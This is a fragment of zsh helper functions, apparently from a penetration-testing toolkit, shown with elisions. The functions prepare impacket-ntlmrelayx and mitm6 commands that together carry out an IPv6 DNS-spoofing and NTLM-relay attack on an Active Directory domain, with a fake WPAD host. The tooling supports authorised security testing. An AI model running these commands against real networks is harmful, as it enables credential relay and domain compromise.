...
nb-ad-ipv6-ntlmrelayx() {
    ...
    print -z "impacket-ntlmrelayx -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l $(__hostpath)/ntlmrelayx"
}
...
nb-ad-ipv6-mitm6() {
    ...
    print -z "sudo mitm6 -d ${__DOMAIN} | tee -a $(__netpath)/mitm6-ipv6.txt"
}
